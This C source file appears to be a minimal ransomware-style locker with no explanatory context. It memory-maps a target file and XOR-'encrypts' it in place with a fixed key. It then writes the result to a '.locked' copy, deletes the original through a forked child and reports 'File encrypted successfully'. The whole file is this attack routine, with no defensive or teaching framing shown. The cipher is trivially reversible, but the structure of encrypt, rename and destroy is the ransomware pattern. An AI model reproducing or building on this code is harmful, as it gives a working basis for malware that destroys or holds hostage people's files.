#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#define KEY 0xFF
int main(int argc, char **argv){
    if(argc != 2){
        fprintf(stderr, "Usage: %s <file>\n", argv[0]);
        exit(1);
    }
    int fd = open(argv[1], O_RDWR);
    if(fd == -1){
        perror("open");
        exit(1);
    }
    struct stat st;
    if(fstat(fd, &st) == -1){
        perror("fstat");
        exit(1);
    }
    char *data = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(data == MAP_FAILED){
        perror("mmap");
        exit(1);
    }

    for(int i = 0; i < st.st_size; i++){
        data[i] ^= KEY;
    }
    close(fd);
    char *new_file = malloc(strlen(argv[1]) + 10);
    sprintf(new_file, "%s.locked", argv[1]);
    fd = open(new_file, O_RDWR | O_CREAT, 0666);
    if(fd == -1){
        perror("open");
        exit(1);
    }
    if(write(fd, data, st.st_size) == -1){
        perror("write");
        exit(1);
    }
    pid_t pid = fork();
    if(pid == -1){
        perror("fork");
        exit(1);
    }
    if(pid == 0){
        if(unlink(argv[1]) == -1){
            perror("unlink");
            exit(1);
        }
        exit(0);
    }

    int status;
    if(wait(&status) == -1){
        perror("wait");
        exit(1);
    }
    printf("%s\n", "File encrypted successfully");
    close(fd);
    return 0;
}